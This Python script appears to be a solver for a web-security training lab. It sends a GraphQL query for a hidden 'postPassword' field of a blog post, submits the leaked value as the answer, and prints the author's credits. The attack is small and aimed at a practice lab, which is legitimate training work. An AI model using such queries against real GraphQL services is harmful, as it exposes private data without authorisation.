import requests
import json
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.answer = None

    def getting_the_answer(self):
        graphql_query = '''
            query {
                getBlogPost(id: 3) {
                    postPassword
                }
            }
        '''
        payload = {
            'query': graphql_query
        }
        response = self.session.post(self.lab_url + 'graphql/v1', json=payload)
        self.answer = json.loads(response.text)['data']['getBlogPost']['postPassword']

    def submitting_the_solution(self):
        data = {
            'answer': self.answer
        }
        self.session.post(self.lab_url + 'submitSolution', data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_the_answer()
        self.submitting_the_solution()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
